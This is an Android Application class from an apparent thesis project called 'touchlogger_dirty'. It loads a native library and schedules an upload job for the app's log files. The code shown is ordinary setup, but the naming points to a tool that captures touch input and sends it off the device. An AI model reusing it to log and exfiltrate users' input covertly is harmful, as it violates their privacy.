package org.leyfer.thesis.touchlogger_dirty;

import android.app.Application;

import com.evernote.android.job.JobManager;

import org.leyfer.thesis.touchlogger_dirty.job.UploadJob;
import org.leyfer.thesis.touchlogger_dirty.job.UploadJobCreator;
import org.leyfer.thesis.touchlogger_dirty.utils.Config;

import java.io.File;

/**
 * Created by kirill on 21.11.17.
 */

public class MainApplication extends Application {
    static {
        System.loadLibrary(Config.MAIN_LIBRARY_NAME);
    }

    @Override
    public void onCreate() {
        super.onCreate();
        File logFilesDir = getApplicationContext().getFilesDir();
        JobManager.create(this).addJobCreator(new UploadJobCreator(logFilesDir));
        UploadJob.scheduleJob();
    }
}
